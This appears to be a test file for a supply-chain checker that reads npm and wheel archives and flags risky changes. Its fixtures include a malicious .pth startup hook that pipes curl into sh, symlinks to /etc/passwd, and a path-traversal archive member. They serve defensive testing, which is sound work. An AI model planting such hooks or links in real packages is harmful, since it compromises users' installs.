import { afterAll, describe, expect, test } from "bun:test";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, existsSync, symlinkSync, linkSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { readArtifact, normalizePaths, mergeArtifactPair } from "../src/artifact.ts";
import { prepass, markLink, type FileMap } from "../src/prepass.ts";

const root = mkdtempSync(join(tmpdir(), "oupdate-artifact-"));
afterAll(() => rmSync(root, { recursive: true, force: true }));

async function pack(name: string, format: "tgz" | "zip", files: Record<string, string>): Promise<string> {
  const src = join(root, `${name}-src`);
  for (const [p, body] of Object.entries(files)) {
    mkdirSync(join(src, p, ".."), { recursive: true });
    writeFileSync(join(src, p), body);
  }
  const out = join(root, `${name}.${format === "tgz" ? "tgz" : "whl"}`);
  const args = format === "tgz" ? ["-czf", out, "-C", src, "."] : ["--format", "zip", "-cf", out, "-C", src, "."];
  const p = Bun.spawnSync(["bsdtar", ...args]);
  if (p.exitCode !== 0) throw new Error(new TextDecoder().decode(p.stderr));
  return out;
}

describe("readArtifact", () => {
  test("reads a tgz into a path map without touching the working tree", async () => {
    const f = await pack("a", "tgz", { "package/package.json": "{}", "package/index.js": "x" });
    const m = await readArtifact(f);
    expect([...m.keys()].sort()).toEqual(["package/index.js", "package/package.json"]);
    expect(new TextDecoder().decode(m.get("package/index.js"))).toBe("x");
  });

  test("reads a wheel (zip)", async () => {
    const f = await pack("b", "zip", { "cook.pth": "import cook", "pkg/__init__.py": "" });
    const m = await readArtifact(f);
    expect(m.has("cook.pth")).toBe(true);
    expect(m.has("pkg/__init__.py")).toBe(true);
  });

  test("strips a leading ./ from member names", async () => {
    const f = await pack("c", "tgz", { "a.txt": "1" });
    const m = await readArtifact(f);
    expect(m.has("a.txt")).toBe(true);
  });

  test("an archive with a path escaping its root is refused", async () => {
    const src = join(root, "evil-src");
    mkdirSync(src, { recursive: true });
    writeFileSync(join(src, "x"), "1");
    const out = join(root, "evil.tar");
    // -s rewrites the member name to ../escape at pack time.
    const p = Bun.spawnSync(["bsdtar", "-cf", out, "-C", src, "-s", ",^x$,../escape,", "x"]);
    expect(p.exitCode).toBe(0);
    await expect(readArtifact(out)).rejects.toThrow(/unsafe member/);
    expect(existsSync(join(root, "escape"))).toBe(false);
  });
});

// Packs files plus links: `links` maps a member path to its symlink target, `hard` to the member it hard-links.
function packLinks(name: string, format: "tgz" | "zip", files: Record<string, string>, links: Record<string, string>, hard: Record<string, string> = {}): string {
  const src = join(root, `${name}-src`);
  for (const [p, body] of Object.entries(files)) {
    mkdirSync(join(src, p, ".."), { recursive: true });
    writeFileSync(join(src, p), body);
  }
  for (const [p, target] of Object.entries(links)) {
    mkdirSync(join(src, p, ".."), { recursive: true });
    symlinkSync(target, join(src, p));
  }
  for (const [p, target] of Object.entries(hard)) linkSync(join(src, target), join(src, p));
  const out = join(root, `${name}.${format === "tgz" ? "tgz" : "whl"}`);
  const args = format === "tgz" ? ["-czf", out, "-C", src, "."] : ["--format", "zip", "-cf", out, "-C", src, "."];
  const p = Bun.spawnSync(["bsdtar", ...args]);
  if (p.exitCode !== 0) throw new Error(new TextDecoder().decode(p.stderr));
  return out;
}

const text = (b: Uint8Array | undefined) => new TextDecoder().decode(b);

describe("readArtifact: links", () => {
  // pip writes a wheel's symlink entry as a regular file holding the entry's data (the link target).
  const payload = "import os; os.system('curl x | sh')";

  test("a symlinked .pth in a wheel is surfaced with the bytes pip installs and hard-stops the pre-pass", async () => {
    const m = normalizePaths(await readArtifact(packLinks("wl", "zip", { "pkg/__init__.py": "" }, { "evil.pth": payload })));
    expect(text(m.get("evil.pth"))).toBe(payload);
    const r = prepass("pypi", new Map([["pkg/__init__.py", new Uint8Array()]]), m);
    expect(r.hard.filter((s) => s.path === "evil.pth").map((s) => s.kind)).toContain("link-startup-hook");
  });

  test("a .pth that was a regular file before and is a link now still hard-stops", async () => {
    const m = normalizePaths(await readArtifact(packLinks("wl2", "zip", { "pkg/__init__.py": "" }, { "evil.pth": payload })));
    const old = new Map([["pkg/__init__.py", new Uint8Array()], ["evil.pth", new TextEncoder().encode(payload)]]);
    expect(prepass("pypi", old, m).hard.map((s) => `${s.kind} ${s.path}`)).toContain("link-startup-hook evil.pth");
  });

  test("a symlink in a tarball pointing outside the package hard-stops", async () => {
    const m = normalizePaths(await readArtifact(packLinks("tl", "tgz", { "package/package.json": "{}", "package/index.js": "x" }, { "package/lib/out": "../../../etc/passwd", "package/abs": "/etc/hosts" })));
    expect(m.has("lib/out")).toBe(true);
    const r = prepass("npm", new Map(), m);
    expect(r.hard.filter((s) => s.kind === "link-outside").map((s) => s.path).sort()).toEqual(["abs", "lib/out"]);
  });

  test("a symlink inside the package holds and still shows its target", async () => {
    const m = normalizePaths(await readArtifact(packLinks("tl2", "tgz", { "package/package.json": "{}", "package/lib/real.js": "x" }, { "package/lib/alias.js": "real.js" })));
    const r = prepass("npm", new Map(), m);
    expect(r.hard.map((s) => s.detail).join(" ")).toMatch(/symlink/);
    expect(r.soft.find((s) => s.path === "lib/alias.js")?.kind).toBe("symlink");
    expect(r.soft.find((s) => s.path === "lib/alias.js")?.detail).toContain("real.js");
  });

  test("a tar hardlink is read as a regular file with the linked member's bytes", async () => {
    const m = await readArtifact(packLinks("th", "tgz", { "a.py": "print(1)" }, {}, { "evil.pth": "a.py" }));
    expect(text(m.get("evil.pth"))).toBe("print(1)");
    expect(text(m.get("a.py"))).toBe("print(1)");
  });

  test("a special file (fifo) holds instead of vanishing", async () => {
    const src = join(root, "fifo-src");
    mkdirSync(src, { recursive: true });
    writeFileSync(join(src, "a.py"), "");
    expect(Bun.spawnSync(["mkfifo", join(src, "evil.pth")]).exitCode).toBe(0);
    const out = join(root, "fifo.tar");
    expect(Bun.spawnSync(["bsdtar", "-cf", out, "-C", src, "."]).exitCode).toBe(0);
    await expect(readArtifact(out)).rejects.toThrow(/special file/);
  });
});

describe("readArtifact: size before unpacking", () => {
  test("an archive declaring more bytes than the cap holds before anything is unpacked", async () => {
    const f = await pack("big", "tgz", { "a.txt": "x".repeat(100) });
    await expect(readArtifact(f, { maxBytes: 50 })).rejects.toThrow(/declares .* bytes/);
  });

  test("an archive with more entries than the cap holds", async () => {
    const f = await pack("many", "zip", { "a": "1", "b": "2", "c": "3", "d": "4" });
    await expect(readArtifact(f, { maxEntries: 3 })).rejects.toThrow(/entries/);
  });
});

describe("normalizePaths", () => {
  const m = (keys: string[]) => new Map(keys.map((k) => [k, new Uint8Array()]));

  test("strips a single shared top dir (sdist name-version/)", () => {
    expect([...normalizePaths(m(["litellm-1.106.2/pyproject.toml", "litellm-1.106.2/litellm/a.py"])).keys()].sort()).toEqual(["litellm/a.py", "pyproject.toml"]);
  });

  test("keeps paths when there is no single top dir (wheel)", () => {
    expect([...normalizePaths(m(["litellm/a.py", "cook.pth"])).keys()].sort()).toEqual(["cook.pth", "litellm/a.py"]);
  });

  test("replaces the version in wheel .dist-info and .data dirs", () => {
    expect([...normalizePaths(m(["litellm/a.py", "litellm-1.107.0.dist-info/METADATA", "litellm-1.107.0.data/purelib/cook.pth"])).keys()].sort()).toEqual([
      "litellm-VERSION.data/purelib/cook.pth",
      "litellm-VERSION.dist-info/METADATA",
      "litellm/a.py",
    ]);
  });

  test("npm package/ top dir is stripped too", () => {
    expect([...normalizePaths(m(["package/package.json", "package/index.js"])).keys()].sort()).toEqual(["index.js", "package.json"]);
  });
});

describe("mergeArtifactPair", () => {
  const enc = (t: string) => new TextEncoder().encode(t);

  test("same path and bytes is kept once; different bytes go under the artifact label with their old copy", () => {
    const into = { old: new Map() as FileMap, new: new Map() as FileMap };
    mergeArtifactPair(into, "py3-none-any.whl", new Map([["a.py", enc("1")]]), new Map([["a.py", enc("2")]]));
    mergeArtifactPair(into, "cp312-macosx.whl", new Map([["a.py", enc("1")], ["b.py", enc("x")]]), new Map([["a.py", enc("2")], ["b.py", enc("y")]]));
    mergeArtifactPair(into, "cp312-linux.whl", new Map([["a.py", enc("1")]]), new Map([["a.py", enc("3")]]));
    expect([...into.new.keys()].sort()).toEqual(["a.py", "b.py", "cp312-linux.whl/a.py"]);
    expect(text(into.old.get("cp312-linux.whl/a.py"))).toBe("1");
  });

  test("same new bytes over a different old copy are not folded away (EVIL->EVIL then clean->EVIL)", () => {
    const into = { old: new Map() as FileMap, new: new Map() as FileMap };
    mergeArtifactPair(into, "py3-none-any.whl", new Map([["x.py", enc("EVIL")]]), new Map([["x.py", enc("EVIL")]]));
    mergeArtifactPair(into, "cp312-macosx.whl", new Map([["x.py", enc("clean")]]), new Map([["x.py", enc("EVIL")]]));
    expect([...into.new.keys()].sort()).toEqual(["cp312-macosx.whl/x.py", "x.py"]);
    expect(text(into.old.get("cp312-macosx.whl/x.py"))).toBe("clean");
    expect(prepass("pypi", into.old, into.new).changed).toEqual(["cp312-macosx.whl/x.py"]);
  });

  test("a file new to its artifact is not folded into a merged copy that had an old side", () => {
    const into = { old: new Map() as FileMap, new: new Map() as FileMap };
    mergeArtifactPair(into, "py3-none-any.whl", new Map([["x.py", enc("EVIL")]]), new Map([["x.py", enc("EVIL")]]));
    mergeArtifactPair(into, "cp312-macosx.whl", new Map(), new Map([["x.py", enc("EVIL")]]));
    expect(prepass("pypi", into.old, into.new).added).toEqual(["cp312-macosx.whl/x.py"]);
  });

  test("same new bytes as a merged copy shown whole (no old side) are read once", () => {
    const into = { old: new Map() as FileMap, new: new Map() as FileMap };
    mergeArtifactPair(into, "py3-none-any.whl", new Map(), new Map([["x.py", enc("v = 2")]]));
    mergeArtifactPair(into, "cp312-macosx.whl", new Map([["x.py", enc("v = 1")]]), new Map([["x.py", enc("v = 2")]]));
    expect([...into.new.keys()]).toEqual(["x.py"]);
  });

  test("a link under a label/ prefix is judged from its path inside the artifact", () => {
    const into = { old: new Map() as FileMap, new: new Map() as FileMap };
    mergeArtifactPair(into, "py3-none-any.whl", new Map(), new Map([["pkg/x.py", enc("x = 1")]]));
    mergeArtifactPair(into, "b.whl", new Map(), new Map([["pkg/x.py", markLink(enc("../../y"))]]));
    mergeArtifactPair(into, "b.whl", new Map(), new Map([["pkg/x.py", markLink(enc("../../z"))], ["pkg/ok.py", markLink(enc("../pkg/x.py"))]]));
    expect([...into.new.keys()].sort()).toEqual(["b.whl#2/pkg/x.py", "b.whl/pkg/x.py", "pkg/ok.py", "pkg/x.py"]);
    const hard = prepass("pypi", into.old, into.new).hard.map((s) => `${s.kind} ${s.path}`);
    expect(hard).toEqual(["link-outside b.whl/pkg/x.py", "link-outside b.whl#2/pkg/x.py"]);
  });

  test("a link with the same bytes as a merged regular file is not folded away", () => {
    const into = { old: new Map() as FileMap, new: new Map() as FileMap };
    mergeArtifactPair(into, "py3-none-any.whl", new Map(), new Map([["evil.pth", enc("import x")]]));
    mergeArtifactPair(into, "cp312-macosx.whl", new Map(), new Map([["evil.pth", markLink(enc("import x"))]]));
    expect([...into.new.keys()].sort()).toEqual(["cp312-macosx.whl/evil.pth", "evil.pth"]);
  });
});
